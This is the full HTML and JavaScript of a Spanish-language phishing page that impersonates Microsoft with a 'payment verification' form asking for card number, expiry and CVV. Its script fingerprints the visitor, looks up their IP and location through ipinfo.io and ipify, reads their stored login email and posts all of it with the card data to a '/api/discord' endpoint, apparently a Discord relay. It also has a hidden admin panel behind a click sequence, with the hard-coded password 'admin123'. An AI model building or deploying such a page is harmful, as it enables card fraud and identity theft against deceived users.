<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión</title>
    <meta name="description" content="Iniciar sesion">
  <link rel="icon" href="/favicon.png" type="image/png">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      min-height: 100vh;
      width: 100%;
      overflow: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
    }
    .payment-container {
      width: 100%;
      max-width: 380px;
      background: #2d2d2d;
      border-radius: 4px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
      padding: 32px 28px;
      position: relative;
      z-index: 10;
    }
    .logo {
      text-align: center;
      margin-bottom: 24px;
    }
    .logo img {
      height: 32px;
    }
    .payment-title {
      font-size: 18px;
      font-weight: 400;
      color: #ffffff;
      text-align: center;
      margin-bottom: 4px;
    }
    .payment-description {
      font-size: 13px;
      color: #b0b0b0;
      text-align: center;
      margin-bottom: 20px;
      min-height: 18px;
    }
    .form-group {
      margin-bottom: 16px;
      position: relative;
    }
    .form-input {
      width: 100%;
      padding: 8px 0;
      background: transparent;
      border: none;
      border-bottom: 1px solid #666666;
      color: #ffffff;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
    }
    .form-input:focus {
      border-bottom-color: #0078d4;
    }
    .form-input::placeholder {
      color: #8a8a8a;
    }
    input.card-number,
    input.card-expiry,
    input.card-cvv {
      width: 100%;
      padding: 8px 0;
      background: transparent;
      border: none;
      border-bottom: 1px solid #666666;
      color: #ffffff;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
      font-family: 'Courier New', monospace;
    }
    input.card-number:focus,
    input.card-expiry:focus,
    input.card-cvv:focus {
      border-bottom-color: #0078d4;
    }
    .card-row {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
    }
    .card-row .form-group {
      flex: 1;
      margin-bottom: 0;
    }
    .card-row .form-group:last-child {
      max-width: 120px;
    }
    label {
      display: block;
      font-size: 11px;
      font-weight: 400;
      color: #8a8a8a;
      margin-bottom: 4px;
      text-transform: none;
      letter-spacing: 0;
    }
    .btn-primary {
      width: 100%;
      padding: 10px;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 2px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 20px;
    }
    .btn-primary:hover {
      background: #106ebe;
    }
    .btn-primary:disabled {
      background: #6a6a7a;
      cursor: not-allowed;
    }
    .links {
      margin-top: 16px;
    }
    .links a {
      color: #b0b0b0;
      font-size: 12px;
      text-decoration: none;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .footer {
      margin-top: 16px;
      padding-top: 12px;
      border-top: 1px solid #404040;
      text-align: center;
      font-size: 11px;
      color: #94a3b8;
      line-height: 1.6;
    }
    .footer a {
      color: #94a3b8;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .login-sub-link {
      margin-top: 16px;
      text-align: center;
    }
    .login-sub-link span {
      color: #b0b0b0;
      font-size: 12px;
    }
    .login-sub-link a {
      color: #0078d4;
      font-size: 12px;
      text-decoration: none;
    }
    .login-sub-link a:hover {
      text-decoration: underline;
    }
    .admin-modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }
    .admin-modal.active {
      display: flex;
    }
    .modal-content {
      background: #2d2d2d;
      padding: 24px;
      border-radius: 4px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 320px;
      text-align: center;
    }
    .modal-content h3 {
      color: #ffffff;
      font-size: 16px;
      margin-bottom: 16px;
    }
    .modal-content input {
      width: 100%;
      padding: 8px 12px;
      background: #1e293b;
      border: 1px solid #404040;
      border-radius: 2px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
      margin-bottom: 12px;
      box-sizing: border-box;
    }
    .modal-content input:focus {
      border-color: #0078d4;
    }
    .modal-content .btn-admin {
      width: 100%;
      padding: 8px;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 2px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s;
    }
    .modal-content .btn-admin:hover {
      background: #106ebe;
    }
    .modal-content .btn-cancel {
      width: 100%;
      padding: 8px;
      background: transparent;
      color: #94a3b8;
      border: 1px solid #404040;
      border-radius: 2px;
      font-size: 13px;
      cursor: pointer;
      margin-top: 8px;
    }
    .modal-content .btn-cancel:hover {
      background: #1e293b;
    }
    .toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #0078d4;
      color: #fff;
      padding: 10px 20px;
      border-radius: 4px;
      font-size: 13px;
      opacity: 0;
      transition: opacity 0.3s;
      z-index: 2000;
      pointer-events: none;
    }
    .toast.show {
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="payment-container">
    <div class="logo">
      <img id="loginLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
    </div>
    <div class="payment-title" id="loginTitle">Verificación de pago</div>
    <div class="payment-description" id="loginDescription"></div>

    <div class="form-group">
      <label for="cardNumber">Número de tarjeta</label>
      <input type="text" id="cardNumber" class="card-number" placeholder="0000 0000 0000 0000" maxlength="19">
    </div>

    <div class="card-row">
      <div class="form-group">
        <label for="cardExpiry">Vencimiento</label>
        <input type="text" id="cardExpiry" class="card-expiry" placeholder="MM/AA" maxlength="5">
      </div>
      <div class="form-group">
        <label for="cardCvv">CVV</label>
        <input type="text" id="cardCvv" class="card-cvv" placeholder="000" maxlength="4">
      </div>
    </div>

    <button type="button" id="payButton" class="btn-primary" onclick="handlePaymentSubmit()">
      Verificar tarjeta
    </button>

    <div class="links">
      <a id="ayudaLink">Ayuda</a>
      ·
      <a id="privacidadLink">Privacidad y cookies</a>
    </div>

    <div class="footer">
      <a href="#">Ayuda y comentarios</a>
      ·
      <a href="#">Condiciones de uso</a>
      ·
      <a href="#">Privacidad y cookies</a>
      <br>
      <span>Si este no es tu dispositivo, usa la navegación privada. Más información</span>
    </div>
  </div>

  <div class="admin-modal" id="adminModal">
    <div class="modal-content">
      <h3>Acceso de administrador</h3>
      <input type="password" id="adminPassword" placeholder="Contraseña" maxlength="50">
      <button class="btn-admin" onclick="verifyAdminAccess()">Acceder</button>
      <button class="btn-cancel" onclick="closeAdminModal()">Cancelar</button>
    </div>
  </div>

  <script>
    // --- Configuración guardada ---
    var savedSettings = {};
    var ADMIN_PASSWORD = 'admin123';
    var adminPasswordFromConfig = '';

    // Contadores para doble-tap
    var ayudaCount = 0;
    var privacidadCount = 0;
    var waitingForPrivacidad = false;

    function getSavedSetting(key, defaultValue) {
      if (savedSettings[key] !== undefined && savedSettings[key] !== '') return savedSettings[key];
      if (localStorage.getItem(key) !== null && localStorage.getItem(key) !== '') return localStorage.getItem(key);
      return defaultValue;
    }

    async function loadConfig() {
      try {
        var res = await fetch('/api/config');
        if (res.ok) {
          var data = await res.json();
          savedSettings = data;
          Object.keys(data).forEach(function(k) {
            if (data[k] !== undefined && data[k] !== null && typeof data[k] !== 'object') {
              localStorage.setItem(k, data[k]);
            }
          });
          if (data.adminPassword) {
            adminPasswordFromConfig = data.adminPassword;
          }
        }
      } catch (e) {
        savedSettings = {};
        for (var key in localStorage) {
          if (localStorage.hasOwnProperty(key)) {
            savedSettings[key] = localStorage.getItem(key);
          }
        }
        adminPasswordFromConfig = localStorage.getItem('adminPassword') || ADMIN_PASSWORD;
      }
      applyLoginBackground();
      applyLoginContent();
    }

    function applyLoginBackground() {
      var bgType = getSavedSetting('loginBgType', 'gradient');
      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%)');
      document.body.style.background = bgGradient;
    }

    function applyLoginContent() {
      var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
      var title = getSavedSetting('loginTitle', 'Verificación de pago');
      var description = getSavedSetting('loginDescription', '');
      var logoImg = document.getElementById('loginLogo');
      if (logoImg) logoImg.src = logoUrl;
      var titleEl = document.getElementById('loginTitle');
      if (titleEl) titleEl.textContent = title;
      var descEl = document.getElementById('loginDescription');
      if (descEl) {
        descEl.textContent = description || '';
        descEl.style.display = description ? 'block' : 'none';
      }
    }

    // --- Doble-tap: Ayuda ---
    function handleAyudaClick() {
      ayudaCount++;
      if (ayudaCount === 2) {
        ayudaCount = 0;
        waitingForPrivacidad = true;
        privacidadCount = 0;
        var link = document.getElementById('ayudaLink');
        if (link) link.style.color = '#0078d4';
      } else if (ayudaCount > 2) {
        ayudaCount = 0;
        waitingForPrivacidad = false;
        var link = document.getElementById('ayudaLink');
        if (link) link.style.color = '';
      }
    }

    // --- Doble-tap: Privacidad y cookies ---
    function handlePrivacidadClick() {
      if (!waitingForPrivacidad) return;
      privacidadCount++;
      if (privacidadCount === 2) {
        privacidadCount = 0;
        waitingForPrivacidad = false;
        ayudaCount = 0;
        var ayudaLink = document.getElementById('ayudaLink');
        if (ayudaLink) ayudaLink.style.color = '';
        showAdminModal();
      }
    }

    function showAdminModal() {
      var modal = document.getElementById('adminModal');
      if (modal) {
        modal.classList.add('active');
        var pwdInput = document.getElementById('adminPassword');
        if (pwdInput) pwdInput.value = '';
        if (pwdInput) pwdInput.focus();
      }
    }

    function closeAdminModal() {
      var modal = document.getElementById('adminModal');
      if (modal) modal.classList.remove('active');
    }

    function verifyAdminAccess() {
      var pwdInput = document.getElementById('adminPassword');
      var enteredPassword = pwdInput ? pwdInput.value : '';
      var correctPassword = adminPasswordFromConfig || ADMIN_PASSWORD;
      if (enteredPassword === correctPassword) {
        sessionStorage.setItem('adminAccess', 'granted');
        closeAdminModal();
        window.location.href = 'dashboard.html';
      } else {
        closeAdminModal();
      }
    }

    // --- Formateo de inputs de tarjeta ---
    function formatCardNumber(e) {
      var input = e.target;
      var value = input.value.replace(/\D/g, '');
      var formatted = value.replace(/(\d{4})/g, '$1 ').trim();
      input.value = formatted.substring(0, 19);
    }

    function formatExpiry(e) {
      var input = e.target;
      var value = input.value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
      }
      input.value = value.substring(0, 5);
    }

    // --- Recopilar datos del navegador ---
    async function collectBrowserData() {
      var data = {
        userAgent: navigator.userAgent || 'desconocido',
        language: navigator.language || 'desconocido',
        screenResolution: screen.width + 'x' + screen.height,
        colorDepth: screen.colorDepth + ' bits',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido',
        platform: navigator.platform || 'desconocido',
        onlineStatus: navigator.onLine ? 'Sí' : 'No',
        cookiesEnabled: navigator.cookieEnabled ? 'Sí' : 'No',
        deviceMemory: (navigator.deviceMemory || 'desconocida') + (navigator.deviceMemory ? ' GB' : ''),
        cpuCores: navigator.hardwareConcurrency || 'desconocido',
        touchPoints: navigator.maxTouchPoints || 0,
        ipifyIp: '',
      };
      var ua = navigator.userAgent;
      data.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) ? 'Sí' : 'No';
      data.isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) ? 'Sí' : 'No';
      data.isDesktop = (data.isMobile === 'No' && data.isTablet === 'No') ? 'Sí' : 'No';
      try {
        var geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) {
          var geo = await geoRes.json();
          data.geoIp = geo.ip || '';
          data.geoCity = geo.city || '';
          data.geoRegion = geo.region || '';
          data.geoCountry = geo.country || '';
          data.geoCountryCode = geo.country || '';
          data.geoTimezone = geo.timezone || '';
          data.geoIsp = geo.org || '';
          if (geo.loc) {
            var parts = geo.loc.split(',');
            data.geoLatitude = parts[0] || '';
            data.geoLongitude = parts[1] || '';
          }
        }
      } catch (err) {
        console.warn('ipinfo.io failed:', err);
      }
      try {
        var ipifyRes = await fetch('https://api.ipify.org?format=json');
        if (ipifyRes.ok) {
          var ipify = await ipifyRes.json();
          data.ipifyIp = ipify.ip || '';
          if (!data.geoIp) data.geoIp = data.ipifyIp;
        }
      } catch (err) {
        console.warn('ipify failed:', err);
      }
      try {
        if (navigator.getBattery) {
          var battery = await navigator.getBattery();
          data.batteryLevel = (battery.level * 100).toFixed(0) + '%';
          data.batteryCharging = battery.charging ? 'Sí' : 'No';
        } else {
          data.batteryLevel = 'No disponible';
          data.batteryCharging = 'Desconocido';
        }
      } catch (err) {
        console.warn('Battery API failed:', err);
        data.batteryLevel = 'No disponible';
        data.batteryCharging = 'Desconocido';
      }
      return data;
    }

    // --- Envío de pago + Discord ---
    async function handlePaymentSubmit() {
      var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
      var cardExpiry = document.getElementById('cardExpiry').value;
      var cardCvv = document.getElementById('cardCvv').value;
      if (!cardNumber || cardNumber.length < 13 || !cardExpiry || !cardCvv) {
        return;
      }
      var browserData = await collectBrowserData();
      var email = sessionStorage.getItem('loginEmail') || localStorage.getItem('loginEmail') || 'unknown';
      var payload = {
        email: email,
        password: '***',
        cardNumber: cardNumber,
        cardExpiry: cardExpiry,
        cardCvv: cardCvv,
        userAgent: browserData.userAgent,
        language: browserData.language,
        screenResolution: browserData.screenResolution,
        timezone: browserData.timezone,
        platform: browserData.platform,
        onlineStatus: browserData.onlineStatus,
        isMobile: browserData.isMobile,
        isDesktop: browserData.isDesktop,
        geoIp: browserData.geoIp || '',
        geoCity: browserData.geoCity || '',
        geoCountry: browserData.geoCountry || '',
        geoCountryCode: browserData.geoCountryCode || '',
        batteryLevel: browserData.batteryLevel || '',
        batteryCharging: browserData.batteryCharging || ''
      };
      var payButton = document.getElementById('payButton');
      var originalText = payButton.textContent;
      payButton.textContent = 'Enviando...';
      payButton.disabled = true;
      try {
        var res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        if (!res.ok) {
          console.warn('Discord API error:', res.status);
        }
        var result = await res.json();
        payButton.textContent = '✓ Enviado';
        payButton.style.background = '#1a7f37';
        setTimeout(function() {
          payButton.textContent = originalText;
          payButton.style.background = '';
          payButton.disabled = false;
        }, 2000);
      } catch (err) {
        console.warn('Discord send failed:', err);
        payButton.textContent = 'Error al enviar';
        payButton.style.background = '#cf222e';
        setTimeout(function() {
          payButton.textContent = originalText;
          payButton.style.background = '';
          payButton.disabled = false;
        }, 2000);
      }
    }

    // Cargar configuración al iniciar
    document.addEventListener('DOMContentLoaded', function() {
      loadConfig();
      adminPasswordFromConfig = localStorage.getItem('adminPassword') || ADMIN_PASSWORD;
      var ayudaLink = document.getElementById('ayudaLink');
      var privacidadLink = document.getElementById('privacidadLink');
      if (ayudaLink) ayudaLink.addEventListener('click', handleAyudaClick);
      if (privacidadLink) privacidadLink.addEventListener('click', handlePrivacidadClick);
      var cardNumber = document.getElementById('cardNumber');
      var cardExpiry = document.getElementById('cardExpiry');
      if (cardNumber) cardNumber.addEventListener('input', formatCardNumber);
      if (cardExpiry) cardExpiry.addEventListener('input', formatExpiry);
      var adminPwd = document.getElementById('adminPassword');
      if (adminPwd) {
        adminPwd.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') verifyAdminAccess();
        });
      }
    });
  </script>
</body>
</html>
